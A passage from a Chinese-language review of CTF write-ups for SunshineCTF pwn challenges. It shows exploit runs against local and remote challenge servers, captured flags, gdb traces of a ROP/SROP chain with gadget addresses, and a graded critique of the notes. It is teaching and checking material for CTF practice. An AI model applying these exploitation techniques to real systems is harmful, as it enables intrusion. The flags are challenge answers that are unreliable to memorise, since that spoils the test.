sun{LOCAL_DUMMY_FLAG}
uid=1001(kzzz) gid=1001(kzzz) groups=1001(kzzz),65534(nobody)
DONE

[+] FLAG: sun{LOCAL_DUMMY_FLAG}
[*] Stopped process './challenge' (pid 3531484)
[exit=0]
```
`leak - buf = 0x7fff176b2ca8 - 0x7fff176b2c28 = 0x80` ✅（與 §3.3 的推導一致）
與 notes §7 第 596–604 行記載的本地輸出**逐字相符**（位址不同是 ASLR，正常）✅

### 4.2 pwn1 遠端 — **PASS**

```
$ cd pwn1 && python3 exploit.py REMOTE
[x] Opening connection to chal.sunshinectf.games on port 26003
[x] Opening connection to chal.sunshinectf.games on port 26003: Trying 35.211.211.18
[+] Opening connection to chal.sunshinectf.games on port 26003: Done
[+] stack leak  = 0x7ffd797fde08
[*] vuln buffer = 0x7ffd797fdd88

[+] raw output:
sun{r3caLl_ev3Ry_reGist3r_sR0p}
uid=1337(total_recall) gid=1337(total_recall) groups=1337(total_recall)
DONE

[+] FLAG: sun{r3caLl_ev3Ry_reGist3r_sR0p}
[*] Closed connection to chal.sunshinectf.games port 26003
[exit=0]
```
與 `pwn1/FLAG.txt` = `sun{r3caLl_ev3Ry_reGist3r_sR0p}` 完全一致 ✅
notes §7 第 579–590 行的輸出**內容相符**，只差在 notes 省略了 pwntools 的 `[x] …Trying` 與
`Closed connection` 兩行（純粹是排版裁剪，不算錯，但「實測輸出」四個字建議加註「已省略 `[x]` 進度行」）。

### 4.3 pwn7 本地 — **PASS**

```
$ cd pwn7 && python3 exploit.py
[x] Starting local process './service'
[+] Starting local process './service': pid 3531481
[*] stage2 pre=b'OK\n' leak=26f8e4b40000 A2=0x40a228
[+] XOR key = 26f8e4b4
[*] stage3 d2ok=b'OK\n' A3=0x40a2e0 RESP=0x40a340
[x] Receiving all data
[x] Receiving all data: 0B
[x] Receiving all data: 30B
[+] Receiving all data: Done (30B)
[*] Process './service' stopped with exit code -11 (SIGSEGV) (pid 3531481)

[+] raw  : b'OK\nSUNSHINE{local_test_flag}\n\n'
[+] FLAG: SUNSHINE{local_test_flag}
[exit=0]
```
* `leak=26f8e4b40000` 是 **6 bytes**（4 bytes key + 2 bytes 雜訊）✅ 與 §7 的說明一致。
* `A2=0x40a228`、`A3=0x40a2e0`、`RESP=0x40a340` ✅ 與 `A2 = A1+0x48+8*11`、
  `A3 = A2+0x48+8*14`、`RESP = A3+0x60` 三條公式完全相符。
* 結尾 `SIGSEGV` 是預期行為（flag 印完後鏈走到盡頭）✅ 與 notes §8 的說明一致。

### 4.4 pwn7 遠端 — **PASS**

```
$ cd pwn7 && python3 exploit.py REMOTE
[x] Opening connection to chal.sunshinectf.games on port 26007
[x] Opening connection to chal.sunshinectf.games on port 26007: Trying 35.211.211.18
[+] Opening connection to chal.sunshinectf.games on port 26007: Done
[*] stage2 pre=b'OK\n' leak=eeb5ed870000 A2=0x40a228
[+] XOR key = eeb5ed87
[*] stage3 d2ok=b'OK\n' A3=0x40a2e0 RESP=0x40a340
[x] Receiving all data
[x] Receiving all data: 0B
[x] Receiving all data: 3B
[x] Receiving all data: 44B
[+] Receiving all data: Done (44B)
[*] Closed connection to chal.sunshinectf.games port 26007

[+] raw  : b'OK\nsun{n3gat1ve_h4ndl3s_0pen_s3cret_d00rs}\n\n'
[+] FLAG: sun{n3gat1ve_h4ndl3s_0pen_s3cret_d00rs}
[exit=0]
```
與 `pwn7/FLAG.txt` = `sun{n3gat1ve_h4ndl3s_0pen_s3cret_d00rs}` 一致 ✅
notes §8 第 878–885 行的輸出**內容相符**（同樣省略了 `[x] Receiving all data` 三行與
`Closed connection` 一行）。

### 4.5 額外的 gdb 實測（支撐本報告的每一條技術宣告）

用「把 key 固定成 `0x11223344`、餵一個預先組好的輸入檔」的方式跑完整條鏈：

```
[key] forced key = 0x11223344
[0x401f07 SUBMIT_READ] rsp=0x40a188  rbx=0xff          ← A1
[0x401529 POP_RDI 第一個 gadget] rax=0x3 rsp=0x40a1d8  ← 鏈開始時 rax = 3 ✅
[0x401c32 mov rdx,rax] rax=0x3 rdx rdi=0x1 rsi=0x405060
[0x401c32 mov rdx,rax] rax=0x3 rdx rdi=0x1 rsi=0x405063   ← 兩次 write 各 3 bytes = 6 bytes ✅
[0x401f07 SUBMIT_READ] rsp=0x40a228  rbx=0xff          ← A2 ✅
[0x401c32 mov rdx,rax] rax=0x3 rdx rdi=0x3 rsi=0x40a228
[0x401c32 mov rdx,rax] rax=0x3 rdx rdi=0x3 rsi=0x40a22b
[0x401c32 mov rdx,rax] rax=0x3 rdx rdi=0x3 rsi=0x40a22e   ← 3 段 × 3 bytes 寫進 fd 3 ✅
[0x401f07 SUBMIT_READ] rsp=0x40a2e0  rbx=0xff          ← A3 ✅
[0x401fda RELAY_RX] rsp=0x40a330 rbx=0x40a340 rsp+0x10=0x40a340
                                                       ← rsp = A3+0x50、RESP = A3+0x60 ✅
```
（`0x401529` 的第一筆 `rsp=0x40a178` 是 gdb 軟體斷點插在 `pop r15` 第二個 byte 造成的假命中，
不影響結論；它同時證明了 B10 的 pivot 圖「`pop r14` 之後 `rsp = 0x40a178`」正確。）

| 測試 | 結果 | 取得的 flag |
|---|---|---|
| pwn1 local | **PASS** | `sun{LOCAL_DUMMY_FLAG}` |
| pwn1 REMOTE | **PASS** | `sun{r3caLl_ev3Ry_reGist3r_sR0p}` |
| pwn7 local | **PASS** | `SUNSHINE{local_test_flag}` |
| pwn7 REMOTE | **PASS** | `sun{n3gat1ve_h4ndl3s_0pen_s3cret_d00rs}` |

---

## 5. 評分與最重要的 3 個改進

### 評分：**7 / 10**（標準：完全新手能否只靠這份文件學會）

* **為什麼有 7 分**：pwn1 那一篇以「完全新手」來說寫得非常好 —— 暫存器、`call`/`ret`、
  `push rsp` 的語意、為什麼是 SROP、`buf = leak-0x80`、`FRAME_OFF = 0x90` 的每一步都有
  可重跑的 gdb 證據，`0x80`/`0x90`/`0x400` 這三個關鍵數字我都用 gdb 逐一複驗過，**全對**。
  round 1 的修正品質也很高（16 條 E 我逐條重驗，內容都正確、沒有改錯方向），
  三張新增的記憶體圖與 `A2/A3/RESP` 公式表讓 pwn7 從「看不懂」變成「可以跟著算」。
* **為什麼扣 3 分**：
  1. **pwn7 §7 的程式片段不可執行**（B1）：缺少 5 個 `recvuntil` 同步點與 `d1`/`d2` 的
     組裝程式碼，新手照抄一定失敗，而且失敗訊息完全指不出原因（key 靜默錯誤）。
     這是最致命的一點 —— 「看得懂」但「跑不出來」。
  2. **§4.1 的 fd 槽事實錯誤**（E1）：教的是「另外兩個槽也是 flag.txt」，實際是 `/dev/null`，
     而且迴圈其實會多寫一格（4 個槽）。這是新手會拿去推理（「那 index=-8 也行吧？」）的地方。
  3. **兩處「表格 vs 腳本」自相矛盾**（E2、E3）：`3 次 read、2 次 send` 與自己下面的表格衝突；
     `0x40106b` 的 `[rsp]` 用同一頁附的腳本跑出來是 `0x40104f`。新手遇到矛盾時會先懷疑
     自己的環境，而不是文件。
  （E4~E7 四條低嚴重度都是「引述組語不精確」，單獨看不會讓人卡住。）

### 三個最有價值的改進（依效益排序）

1. **把 `pwn7/notes.md` §7 改成「可直接執行」的完整片段**：補上 5 個 `recvuntil`／`recvn`
   同步點、`d1`/`d2`/`d3` 的組裝（含 `d1[0x40] = 0xff`、`d1[0x48:…]`、`assert len(stage)==112`），
   並在開頭寫「完整程式在 `pwn7/exploit.py`」。這一項單獨就能把分數從 7 拉到 8.5，
   因為它把「讀懂」變成「做得出來」。（本文第 3 節 B1 已提供可直接貼上的版本。）
2. **修正 §4.1 的 fd 槽敘述，並把 §6.2 的 `.bss` 圖補成一張「真正的槽表」**：
   4 個 `state = 2` 的槽（`0x405080` = flag.txt、`0x40548c`/`0x405898`/`0x405ca4` = /dev/null），
   並解釋「迴圈先寫後比，所以多寫一格」。這樣讀者才能自己算出「只有 `-4` 能打到 flag fd」。
3. **修正 pwn1 §3.3 的表格與腳本，讓兩者一致**：`0x40106b` 那一列拆成「餵滿 payload →
   `0x40104f`」與「只餵 24 bytes → `0x40100a`」兩列，並把重現腳本從 2 個中斷點擴充到 6 個
   （本文第 3 節 B3 已提供），順手把「3 次 read、2 次 send」改成「3 次 read、3 次 send」。
